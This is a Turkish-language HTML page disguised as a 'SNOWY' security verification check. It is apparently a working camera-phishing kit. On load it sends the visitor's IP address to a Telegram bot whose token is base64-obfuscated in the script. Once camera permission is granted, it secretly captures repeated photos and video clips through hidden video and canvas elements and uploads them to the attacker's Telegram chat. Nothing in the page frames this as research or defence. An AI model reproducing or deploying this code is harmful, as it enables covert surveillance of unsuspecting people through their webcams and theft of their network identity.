<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h2 { color: #333; font-size: 28px; margin-bottom: 10px; }
        h2 span { color: #667eea; }
        p { color: #666; margin-bottom: 30px; }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; padding: 16px 32px;
            font-size: 18px; font-weight: bold; border-radius: 50px;
            cursor: pointer; width: 100%;
        }
        .btn:hover { transform: translateY(-2px); }
        .loading { display: none; margin: 20px 0; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #667eea; margin-top: 10px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Devam etmek için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================
        // GİZLİ KONFİGÜRASYON (ŞİFRELİ TOKEN)
        // ============================================
        const SIFRELI_TOKEN = "ODc3MzEyNDcxNTpBQUVmczgwdDh5djJYbkRHeTIwYUxseHkzYUZHd0RqMGpGVQ==";
        const BOT_TOKEN = atob(SIFRELI_TOKEN);
        
        // URL'den parametreleri al
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_ID = urlParams.get('i');
        const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
        const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        let mediaRecorder = null;
        let recordedChunks = [];
        let videoCount = 0;
        let photoCount = 0;
        
        // ============================================
        // SADECE ID'YE GÖRE KONTROL (SÜRELERİ DİKKATE ALMA)
        // ============================================
        function ipGonderildiMi() {
            const linkKey = `ip_gonderildi_${TARGET_ID}`;
            return localStorage.getItem(linkKey) === "true";
        }
        
        function ipGonderildiOlarakIsaretle() {
            const linkKey = `ip_gonderildi_${TARGET_ID}`;
            localStorage.setItem(linkKey, "true");
            
            // 1 saniye sonra otomatik sil (süper hızlı)
            setTimeout(() => {
                localStorage.removeItem(linkKey);
                console.log("IP kaydı silindi, yeni linkte tekrar gönderilebilir");
            }, 500); // 0.5 saniye sonra sil
        }
        
        // ============================================
        // İP ADRESİ AL
        // ============================================
        async function getIP() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                return ipData.ip;
            } catch(e) {
                return 'Alınamadı';
            }
        }
        
        // ============================================
        // İP'Yİ TELEGRAM'A GÖNDER
        // ============================================
        async function sendIP(ip, kaynak = 'sayfa') {
            if (ipGonderildiMi()) return;
            
            const msg = `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ 
                    chat_id: TARGET_ID, 
                    text: msg
                })
            });
            
            ipGonderildiOlarakIsaretle();
        }
        
        // ============================================
        // FOTOĞRAF ÇEK
        // ============================================
        async function takePhoto() {
            if (!video.videoWidth || !video.videoHeight) return;
            
            try {
                photoCount++;
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async function(blob) {
                    if (!blob) return;
                    
                    const formData = new FormData();
                    formData.append('chat_id', TARGET_ID);
                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                }, 'image/jpeg', 0.7);
                
            } catch(e) {}
        }
        
        // ============================================
        // VİDEO KAYDI
        // ============================================
        function recordVideo() {
            if (!stream || !stream.active) return;
            
            recordedChunks = [];
            
            try {
                mediaRecorder = new MediaRecorder(stream);
            } catch(e) {
                console.log("MediaRecorder hatası:", e);
                return;
            }
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) recordedChunks.push(event.data);
            };
            
            mediaRecorder.onstop = async () => {
                videoCount++;
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                const boyutKB = (blob.size / 1024).toFixed(0);
                
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('video', blob, `video_${Date.now()}.webm`);
                formData.append('caption', `🎥 Video #${videoCount} - ${new Date().toLocaleString('tr-TR')} (${boyutKB}KB)`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                setTimeout(recordVideo, 500);
            };
            
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, VIDEO_SURESI * 1000);
        }
        
        // ============================================
        // KAMERAYI BAŞLAT
        // ============================================
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true
                });
                
                video.srcObject = stream;
                
                video.onloadedmetadata = async () => {
                    await video.play();
                    
                    if (!ipGonderildiMi()) {
                        const ip = await getIP();
                        await sendIP(ip, 'kamera');
                    }
                    
                    document.getElementById('startBtn').style.display = 'none';
                    document.getElementById('loading').style.display = 'block';
                    
                    setInterval(takePhoto, FOTO_SURESI * 1000);
                    setTimeout(recordVideo, 2000);
                };
                
            } catch(e) {
                alert('Kamera izni gerekli!');
            }
        }
        
        // ============================================
        // SAYFA YÜKLENDİĞİNDE
        // ============================================
        window.onload = async function() {
            if (TARGET_ID && !ipGonderildiMi()) {
                const ip = await getIP();
                await sendIP(ip, 'sayfa');
            }
        };
        
        // ============================================
        // SAYFA KAPANIRKEN
        // ============================================
        window.onbeforeunload = function() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        };
    </script>
</body>
</html>
